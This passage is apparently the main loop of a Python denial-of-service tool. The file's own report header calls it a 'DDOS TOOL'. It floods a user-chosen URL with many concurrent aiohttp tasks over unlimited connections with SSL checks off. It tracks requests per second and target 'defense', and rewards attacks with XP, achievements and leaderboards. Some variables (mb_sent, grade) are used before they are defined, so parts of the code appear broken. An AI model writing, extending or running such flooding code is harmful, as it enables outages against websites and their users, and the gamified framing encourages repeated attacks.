            await show_prestige_menu()
            continue
        
        # Choice == "1" - Start attack
        stop_requested = False  # Reset flag for new attack
        
        try:
            config = await get_simple_input()
            
            target_url = config["target_url"]
            threads = config["threads"]
            duration = config["duration"]
            mode = config.get("mode", "normal")
            
            # Mission briefing
            await mission_briefing(target_url, mode)
            
            stats = {
                "success": 0,
                "fail": 0,
                "total": 0,
                "bytes_sent": 0,
                "response_times": [],
                "crits": 0,
                "total_damage": 0,
            }
            
            # Initialize combo counter
            session_stats["current_combo"] = 0
            session_stats["current_success_rate"] = 0
            
            # Reset berserker stacks
            global BERSERKER_STACKS
            BERSERKER_STACKS = 0
            
            # Calculate power before attack
            power_data = calculate_total_power()
            error_counts = {}
            stop_event = asyncio.Event()
            
            console.print("" + "─" * 70 + "")
            await type_text("> INITIATING ATTACK SEQUENCE", 0.02)
            console.print("" + "─" * 70 + "")
            console.print()
            console.print("  Press Ctrl+C or Ctrl+Q to stop attack")
            console.print()
            
            # Countdown
            for i in range(3, 0, -1):
                console.print(f"  {i}...")
                await asyncio.sleep(0.5)
            console.print("  ATTACK LAUNCHED")
            console.print()
            
            # Create connector
            connector = aiohttp.TCPConnector(
                limit=0,
                limit_per_host=0,
                ttl_dns_cache=300,
                force_close=False,
                enable_cleanup_closed=True,
                ssl=False
            )
            
            timeout = aiohttp.ClientTimeout(total=10, connect=5)
            
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                start_time = time.time()
                
                # Create attack tasks
                mode_info = ATTACK_MODES.get(mode, ATTACK_MODES["normal"])
                attack_pattern = mode_info.get("pattern", "steady")
                
                tasks = []
                for i in range(threads):
                    task = asyncio.create_task(
                        attacker_task(
                            target_url,
                            session,
                            stats,
                            error_counts,
                            stop_event,
                            999999,  # Max requests per thread
                            attack_pattern,
                            power_data
                        )
                    )
                    tasks.append(task)
                
                # Live dashboard
                dashboard_task = asyncio.create_task(live_dashboard(stats, error_counts, stop_event, target_url))
                
                # Monitor for stop conditions
                try:
                    while not stop_event.is_set() and not stop_requested:
                        await asyncio.sleep(0.1)
                        if time.time() - start_time >= duration:
                            stop_event.set()
                            break
                        if stop_requested:
                            stop_event.set()
                            break
                except KeyboardInterrupt:
                    console.print("\n> ATTACK STOPPED BY USER")
                    stop_event.set()
                
                # If Ctrl+Q was pressed
                if stop_requested:
                    console.print("\n> ATTACK STOPPED - Returning to menu...")
                    stop_event.set()
                
                # Wait for tasks
                await asyncio.gather(*tasks, return_exceptions=True)
                await dashboard_task
            
            elapsed = time.time() - start_time
            
            # Epilogue sequence
            await epilogue_sequence()
            
            # Update session stats and leaderboard
            session_stats["total_attacks"] += 1
            session_stats["total_requests"] += stats["total"]
            current_rps = stats["total"] / elapsed if elapsed > 0 else 0
            current_success_rate = (stats["success"] / max(stats["total"], 1)) * 100
            
            if current_rps > session_stats["best_rps"]:
                session_stats["best_rps"] = current_rps
            if current_success_rate > session_stats["best_success_rate"]:
                session_stats["best_success_rate"] = current_success_rate
            
            # Add to target history
            if target_url not in session_stats["target_history"]:
                session_stats["target_history"].append(target_url)
                if len(session_stats["target_history"]) > 5:
                    session_stats["target_history"].pop(0)
            
            # Update leaderboard
            update_leaderboard(stats, target_url, elapsed)
            
            # Calculate XP and check achievements
            xp_gained = calculate_xp_gain(stats["total"], current_success_rate, current_rps)
            
            # Apply equipment bonuses
            equipment_bonuses = apply_equipment_bonuses()
            xp_gained = int(xp_gained * (1 + equipment_bonuses["xp_bonus"] / 100))
            
            # Apply prestige bonuses
            prestige_bonuses = apply_prestige_bonuses()
            xp_gained = int(xp_gained * prestige_bonuses["xp_multiplier"])
            
            session_stats["xp"] += xp_gained
            session_stats["total_data_sent"] += mb_sent
            
            # Award currency based on performance
            currency_earned = int(stats["total"] / 100) + int(current_rps / 10)
            session_stats["currency"] += currency_earned
            
            # Award skill points on level up
            leveled_up, new_level, remaining_xp = check_level_up(session_stats["xp"], session_stats["level"])
            if leveled_up:
                session_stats["level"] = new_level
                session_stats["xp"] = remaining_xp
                session_stats["skill_points"] += 1  # Award 1 skill point per level
            
            # Save to database
            save_attack_to_database(stats, target_url, elapsed, mode, threads, grade, xp_gained)
            
            # Adaptive AI learning
            adaptive_ai_learn(stats, elapsed, threads)
            
            # Check achievements
            new_achievements = check_achievements(stats, elapsed, mode)
            for achievement_id in new_achievements:
                if achievement_id not in session_stats["achievements_unlocked"]:
                    session_stats["achievements_unlocked"].append(achievement_id)
                    achievement = ACHIEVEMENTS_LIST[achievement_id]
                    session_stats["xp"] += achievement["xp"]
                    await show_achievement_unlock(achievement_id)
            
            # Check for multi-target achievement
            if config.get("multi_target") and "multi_target" not in session_stats["achievements_unlocked"]:
                session_stats["achievements_unlocked"].append("multi_target")
                achievement = ACHIEVEMENTS_LIST["multi_target"]
                session_stats["xp"] += achievement["xp"]
                await show_achievement_unlock("multi_target")
            
            # Check daily challenge
            daily_challenge = await check_daily_challenge(stats, elapsed, current_rps)
            if daily_challenge:
                console.print()
                console.print("" + "═" * 70 + "")
                console.print(">>> DAILY CHALLENGE COMPLETED <<<".center(70))
                console.print(f"{daily_challenge['desc']}".center(70))
                console.print(f"+{daily_challenge['xp']} XP".center(70))
                console.print("" + "═" * 70 + "")
                await asyncio.sleep(1.5)
            
            # Show explosion on major milestones
            if stats["total"] >= 10000 and stats["total"] < 10100:
                await show_explosion("large")
                await screen_shake_effect(">>> 10,000 REQUESTS MILESTONE <<<", 0.3)
            elif stats["total"] >= 5000 and stats["total"] < 5100:
                await show_explosion("medium")
                await screen_shake_effect(">>> 5,000 REQUESTS MILESTONE <<<", 0.3)
            elif stats["total"] >= 1000 and stats["total"] < 1100:
                await show_explosion("small")
                await screen_shake_effect(">>> 1,000 REQUESTS MILESTONE <<<", 0.3)
            
            # Update streak
            if current_success_rate >= 50:
                session_stats["streak"] += 1
            else:
                session_stats["streak"] = 0
            
            # Animated outro
            await animated_outro(current_success_rate)
            
            # Final report with all enhancements
            console.print()
            console.print("" + "═" * 70 + "")
            console.print("MISSION COMPLETE".center(70))
            console.print("" + "═" * 70 + "")
            console.print()
            
            # Performance grade
            grade, grade_color = get_performance_grade(current_rps, current_success_rate)
            target_analysis = analyze_target_strength(current_success_rate, 0)
            
            # Show level up notification
            if leveled_up:
                console.print()
                console.print("" + "═" * 70 + "")
                console.print(">>> LEVEL UP! <<<".center(70))
                console.print(f"Level {new_level - 1} → Level {new_level}".center(70))
                console.print("" + "═" * 70 + "")
                await asyncio.sleep(1)
            
            # Main stats table
            stats_table = Table.grid(expand=True)
            stats_table.add_column(justify="left", style="bold white", width=30)
            stats_table.add_column(justify="right", style="white", width=20)
            
            stats_table.add_row("Total Requests", f"{stats['total']:,}")
            stats_table.add_row("Successful", f"{stats['success']:,}")
            stats_table.add_row("Failed", f"{stats['fail']:,}")
            stats_table.add_row("Success Rate", f"{current_success_rate:.1f}%")
            
            # Pie chart
            pie = create_pie_chart(stats["success"], stats["fail"], 30)
            stats_table.add_row("Distribution", f"{pie}")
            
            stats_table.add_row("", "")
            stats_table.add_row("Requests/Second", f"{current_rps:.0f}")
            stats_table.add_row("Data Sent", f"{stats['bytes_sent']/(1024*1024):.2f} MB")
            stats_table.add_row("Duration", f"{elapsed:.2f}s")
            stats_table.add_row("", "")
            stats_table.add_row("Performance Grade", f"[{grade_color}]{grade}[/{grade_color}]")
            stats_table.add_row("Target Strength", f"{target_analysis['strength']}")
            stats_table.add_row("Defense Type", f"{target_analysis['defense']}")
            stats_table.add_row("", "")
            stats_table.add_row("XP Gained", f"+{xp_gained}")
            stats_table.add_row("Currency Earned", f"+{currency_earned}")
            stats_table.add_row("Current Level", f"{session_stats['level']}")
            stats_table.add_row("Achievements", f"{len(session_stats['achievements_unlocked'])}/{len(ACHIEVEMENTS_LIST)}")
            
            console.print(Panel(stats_table, title="╣ ATTACK REPORT ╠", border_style="white"))
            console.print()
            
            # Session statistics
            session_table = Table.grid(expand=True)
            session_table.add_column(justify="left", style="dim white", width=30)
            session_table.add_column(justify="right", style="white", width=20)
            
            session_table.add_row("Session Attacks", f"{session_stats['total_attacks']}")
            session_table.add_row("Session Requests", f"{session_stats['total_requests']:,}")
            session_table.add_row("Total Data Sent", f"{session_stats['total_data_sent']:.2f} MB")
            session_table.add_row("Best RPS", f"{session_stats['best_rps']:.0f}")
            session_table.add_row("Best Success Rate", f"{session_stats['best_success_rate']:.1f}%")
            session_table.add_row("Current Streak", f"{session_stats['streak']}")
            session_table.add_row("Total XP", f"{session_stats['xp']}")
            session_table.add_row("Level", f"{session_stats['level']}")
            
            console.print(Panel(session_table, title="╣ SESSION STATS ╠", border_style="dim white"))
            console.print()
            
            # Records broken
            if current_rps >= session_stats["best_rps"] - 1:
                console.print(">>> NEW RECORD: PEAK RPS <<<".center(70))
                console.print()
            
            if current_success_rate >= session_stats["best_success_rate"] - 1:
                console.print(">>> NEW RECORD: SUCCESS RATE <<<".center(70))
                console.print()
            
            # Error breakdown
            if error_counts:
                error_table = Table.grid(expand=True)
                error_table.add_column(justify="left", style="dim white", width=40)
                error_table.add_column(justify="right", style="white", width=15)
                
                for err, count in sorted(error_counts.items(), key=lambda x: x[1], reverse=True)[:5]:
                    percentage = (count / stats["fail"]) * 100 if stats["fail"] > 0 else 0
                    error_table.add_row(err, f"{count:,} ({percentage:.0f}%)")
                
                console.print(Panel(error_table, title="╣ ERROR ANALYSIS ╠", border_style="dim white"))
                console.print()
            
            # Target history
            if len(session_stats["target_history"]) > 1:
                console.print("Recent Targets:")
                for i, target in enumerate(reversed(session_stats["target_history"][-5:]), 1):
                    marker = ">" if target == target_url else " "
                    console.print(f"  {marker} {i}. {target[:50]}")
                console.print()
            
            # If Ctrl+Q was pressed, go directly back to menu
            if stop_requested:
                console.print("[white]Returning to menu...[/white]")
                for i in range(3, 0, -1):
                    console.print(f"[white]{i}...[/white]", end=" ")
                    await asyncio.sleep(0.3)
                console.print()
                console.clear()
                for line in ASCII_LOGO.split('\n'):
                    console.print(f"[white]{line}[/white]")
                console.print()
                
                # Clean separator
                separator = "".join(['─'] * 70)
                console.print(f"[white]{separator}[/white]", justify="center")
                console.print()
                
                continue
            
            # Interactive menu
            console.print()
            
            # Show leaderboard
            show_leaderboard()
            
            console.print("" + "─" * 70 + "")
            console.print()
            console.print("Options:")
            console.print("  [R] Restart with same target")
            console.print("  [N] New target")
            console.print("  [L] View leaderboard")
            console.print("  [A] View achievements")
            console.print("  [C] Save configuration")
            console.print("  [S] Save report (TXT)")
            console.print("  [E] Export report (CSV/HTML)")
            console.print("  [Q] Quit")
            console.print()
            
            choice = Prompt.ask(
                "Select option",
                choices=["r", "n", "l", "a", "c", "s", "e", "q", "R", "N", "L", "A", "C", "S", "E", "Q"],
                default="n"
            )
            
            choice = choice.lower()
            
            if choice == "a":
                # Show achievements
                console.clear()
                console.print()
                console.print("ACHIEVEMENTS".center(70))
                console.print("" + "─" * 70 + "")
                console.print()
                
                for achievement_id, achievement in ACHIEVEMENTS_LIST.items():
                    unlocked = achievement_id in session_stats["achievements_unlocked"]
                    status = "✓" if unlocked else "✗"
                    name_style = "white" if unlocked else "dim white"
                    console.print(f"{status} [{name_style}]{achievement['name']}[/{name_style}]")
                    console.print(f"   {achievement['desc']} (+{achievement['xp']} XP)")
                    console.print()
                
                console.print(f"Unlocked: {len(session_stats['achievements_unlocked'])}/{len(ACHIEVEMENTS_LIST)}")
                console.print()
                input("Press ENTER to continue...")
                
                # Ask again
                choice = Prompt.ask(
                    "Start new attack? (yes/no)",
                    choices=["yes", "no", "y", "n"],
                    default="yes"
                )
                if choice.lower() in ["no", "n"]:
                    break
                choice = "n"
            
            elif choice == "c":
                # Save configuration
                config_to_save = {
                    "target_url": target_url,
                    "threads": threads,
                    "duration": duration,
                    "mode": mode,
                }
                if save_config(config_to_save):
                    console.print("> Configuration saved to attack_config.json")
                else:
                    console.print("> Failed to save configuration")
                await asyncio.sleep(1)
                
                # Ask again
                choice = Prompt.ask(
                    "Start new attack? (yes/no)",
                    choices=["yes", "no", "y", "n"],
                    default="yes"
                )
                if choice.lower() in ["no", "n"]:
                    break
                choice = "n"
            
            elif choice == "q":
                console.print()
                console.print("> Shutting down...")
                await asyncio.sleep(0.5)
                break
            elif choice == "s":
                # Save report
                filename = f"attack_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                with open(filename, "w") as f:
                    f.write("=" * 70 + "\n")
                    f.write("DDOS TOOL - ATTACK REPORT\n")
                    f.write("=" * 70 + "\n\n")
                    f.write(f"Target: {target_url}\n")
                    f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                    f.write(f"Total Requests: {stats['total']:,}\n")
                    f.write(f"Successful: {stats['success']:,}\n")
                    f.write(f"Failed: {stats['fail']:,}\n")
                    f.write(f"Success Rate: {current_success_rate:.1f}%\n")
                    f.write(f"RPS: {current_rps:.0f}\n")
                    f.write(f"Data Sent: {stats['bytes_sent']/(1024*1024):.2f} MB\n")
                    f.write(f"Duration: {elapsed:.2f}s\n")
                    f.write(f"Grade: {grade}\n")
                    f.write(f"Target Strength: {target_analysis['strength']}\n\n")
                    f.write("Errors:\n")
                    for err, count in sorted(error_counts.items(), key=lambda x: x[1], reverse=True):
                        f.write(f"  {err}: {count:,}\n")
                
                console.print(f"> Report saved to {filename}")
                await asyncio.sleep(1)
                
                # Ask again
                choice = Prompt.ask(
                    "Start new attack? (yes/no)",
                    choices=["yes", "no", "y", "n"],
                    default="yes"
                )
                if choice.lower() in ["no", "n"]:
                    break
                choice = "n"  # Continue to new target
            
            elif choice == "e":
                # Export report (CSV/HTML)
                console.print()
                export_format = Prompt.ask(
                    "Export format",
                    choices=["csv", "html", "CSV", "HTML"],
                    default="csv"
                )
                export_format = export_format.lower()
                
                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                if export_format == "csv":
                    filename = f"attack_report_{timestamp}.csv"
                    if export_report_csv(stats, target_url, elapsed, filename):
                        console.print(f"> Report exported to {filename}")
                    else:
                        console.print("> Export failed")
                else:
                    filename = f"attack_report_{timestamp}.html"
                    if export_report_html(stats, target_url, elapsed, filename):
                        console.print(f"> Report exported to {filename}")
                    else:
                        console.print("> Export failed")
                
                await asyncio.sleep(1)
                
                # Ask again
                choice = Prompt.ask(
                    "Start new attack? (yes/no)",
                    choices=["yes", "no", "y", "n"],
                    default="yes"
                )
                if choice.lower() in ["no", "n"]:
                    break
                choice = "n"
            
            if choice == "r":
                # Restart with same target - keep config
                console.print("[white]> Restarting with same target...[/white]")
                await asyncio.sleep(0.5)
                console.clear()
                for line in ASCII_LOGO.split('\n'):
                    console.print(f"[white]{line}[/white]")
                console.print()
                
                # Clean separator
                separator = "".join(['─'] * 70)
                console.print(f"[white]{separator}[/white]", justify="center")
                console.print()
                
                # Skip input, use same config
                continue
            
            # New target (choice == "n")
            console.clear()
            for line in ASCII_LOGO.split('\n'):
                console.print(f"[white]{line}[/white]")
            console.print()
            
            # Clean separator
            separator = "".join(['─'] * 70)
            console.print(f"[white]{separator}[/white]", justify="center")
            console.print()
            
        except KeyboardInterrupt:
            # Ctrl+C during input - go back to menu
            console.print("\n[white]> Returning to menu...[/white]")
            await asyncio.sleep(0.5)
            console.clear()
            for line in ASCII_LOGO.split('\n'):
                console.print(f"[white]{line}[/white]")
            console.print()
            
            # Clean separator
            separator = "".join(['─'] * 70)
            console.print(f"[white]{separator}[/white]", justify="center")
            console.print()
            
            continue

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except Exception as e:
        console.print(f"FATAL ERROR: {e}")
